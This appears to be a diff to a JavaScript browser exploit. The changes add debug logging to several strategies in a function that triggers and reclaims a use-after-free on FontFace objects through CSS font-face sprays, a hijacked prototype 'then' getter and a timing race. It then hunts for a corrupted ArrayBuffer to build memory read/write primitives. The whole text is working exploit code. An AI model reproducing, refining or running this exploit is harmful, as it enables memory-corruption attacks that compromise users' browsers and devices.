@@ -894,8 +894,8 @@ async function init_rw() {
   async function try_then_getter() {
     const style = document.createElement("style");
     document.head.appendChild(style);
-    const spray_font_rule = `@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }`;
-    const uaf_font_rule = `@font-face { font-family: b; src: url(nonexistent-font.woff); unicode-range: U+0042; }`;
+    const spray_font_rule = "@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }";
+    const uaf_font_rule = "@font-face { font-family: b; src: url(nonexistent-font.woff); unicode-range: U+0042; }";
 
     for (let i = 0; i < spray_count / 4; i++)
       style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
@@ -945,6 +945,10 @@ async function init_rw() {
         setTimeout(function() { reject(new Error("timeout")); }, 10000);
       });
       const fonts = await Promise.race([fontPromise, timeoutPromise]);
+      logger.info("then-getter: loaded " + fonts.length + " fonts");
+      for (let fi = 0; fi < fonts.length; fi++) {
+        logger.info("  font[" + fi + "]: family=" + fonts[fi].family + " ur=" + fonts[fi].unicodeRange);
+      }
       Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
       if (fonts.length < 1) return null;
 
@@ -954,15 +958,18 @@ async function init_rw() {
         if (font.unicodeRange === "U+0-10FFFF") { uaf_font = font; break; }
       }
       if (!uaf_font) { for (const font of fonts) { if (font !== A) { uaf_font = font; break; } } }
-      if (!uaf_font) return null;
+      if (!uaf_font) { logger.info("then-getter: no UAF font found"); return null; }
+
+      logger.info("then-getter: candidate font=" + uaf_font.family + " ur=" + uaf_font.unicodeRange);
 
       for (const ab of abs) {
         if (new DataView(ab).getBInt(8, true).eq(2)) { uaf_ab = ab; break; }
       }
-      if (!uaf_ab) return null;
+      if (!uaf_ab) { logger.info("then-getter: no UAF ArrayBuffer found"); return null; }
 
       return { uaf_ab, uaf_font, leak: { obj: 0 }, leak_addr: undefined };
     } catch (e) {
+      logger.info("then-getter: error: " + e.message);
       Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
       return null;
     }
@@ -972,8 +979,8 @@ async function init_rw() {
   async function try_settimeout_race() {
     const style = document.createElement("style");
     document.head.appendChild(style);
-    const spray_font_rule = `@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }`;
-    const uaf_font_rule = `@font-face { font-family: c; src: url(nonexistent-font.woff); unicode-range: U+0043; }`;
+    const spray_font_rule = "@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }";
+    const uaf_font_rule = "@font-face { font-family: c; src: url(nonexistent-font.woff); unicode-range: U+0043; }";
 
     for (let i = 0; i < spray_count / 4; i++)
       style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
@@ -1019,6 +1026,10 @@ async function init_rw() {
         setTimeout(function() { reject(new Error("timeout")); }, 10000);
       });
       const fonts = await Promise.race([loadPromise, timeoutPromise]);
+      logger.info("settimeout-race: loaded " + fonts.length + " fonts");
+      for (let fi = 0; fi < fonts.length; fi++) {
+        logger.info("  font[" + fi + "]: family=" + fonts[fi].family + " ur=" + fonts[fi].unicodeRange);
+      }
       if (fonts.length < 1) return null;
 
       let uaf_font = null;
@@ -1027,15 +1038,16 @@ async function init_rw() {
         if (font.unicodeRange === "U+0-10FFFF") { uaf_font = font; break; }
       }
       if (!uaf_font) { uaf_font = fonts[0]; }
-      if (!uaf_font) return null;
+      if (!uaf_font) { logger.info("settimeout-race: no UAF font found"); return null; }
 
       for (const ab of abs) {
         if (new DataView(ab).getBInt(8, true).eq(2)) { uaf_ab = ab; break; }
       }
-      if (!uaf_ab) return null;
+      if (!uaf_ab) { logger.info("settimeout-race: no UAF ArrayBuffer found"); return null; }
 
       return { uaf_ab, uaf_font, leak: { obj: 0 }, leak_addr: undefined };
     } catch (e) {
+      logger.info("settimeout-race: error: " + e.message);
       return null;
     }
   }
@@ -1044,7 +1056,7 @@ async function init_rw() {
   async function try_direct_uaf() {
     const style = document.createElement("style");
     document.head.appendChild(style);
-    const uaf_font_rule = `@font-face { font-family: d; src: url(nonexistent-font.woff); unicode-range: U+0044; }`;
+    const uaf_font_rule = "@font-face { font-family: d; src: url(nonexistent-font.woff); unicode-range: U+0044; }";
     const uaf_rule_index = style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
     document.body.offsetTop;
 
@@ -1069,6 +1081,10 @@ async function init_rw() {
         setTimeout(function() { reject(new Error("timeout")); }, 10000);
       });
       const fonts = await Promise.race([loadPromise, timeoutPromise]);
+      logger.info("direct-uaf: loaded " + fonts.length + " fonts");
+      for (let fi = 0; fi < fonts.length; fi++) {
+        logger.info("  font[" + fi + "]: family=" + fonts[fi].family + " ur=" + fonts[fi].unicodeRange);
+      }
       if (fonts.length < 1) return null;
 
       let uaf_font = null;
@@ -1077,15 +1093,16 @@ async function init_rw() {
         if (font.unicodeRange === "U+0-10FFFF") { uaf_font = font; break; }
       }
       if (!uaf_font) { uaf_font = fonts[0]; }
-      if (!uaf_font) return null;
+      if (!uaf_font) { logger.info("direct-uaf: no UAF font found"); return null; }
 
       for (const ab of abs) {
         if (new DataView(ab).getBInt(8, true).eq(2)) { uaf_ab = ab; break; }
       }
-      if (!uaf_ab) return null;
+      if (!uaf_ab) { logger.info("direct-uaf: no UAF ArrayBuffer found"); return null; }
 
       return { uaf_ab, uaf_font, leak: { obj: 0 }, leak_addr: undefined };
     } catch (e) {
+      logger.info("direct-uaf: error: " + e.message);
       return null;
     }
   }
@@ -1107,8 +1124,6 @@ async function init_rw() {
 
   throw new Error("Unable to reclaim UAF FontFace !!");
 }
-
-
 async function init_arw(rw) {
   logger.info("Initiate ARW...");
 
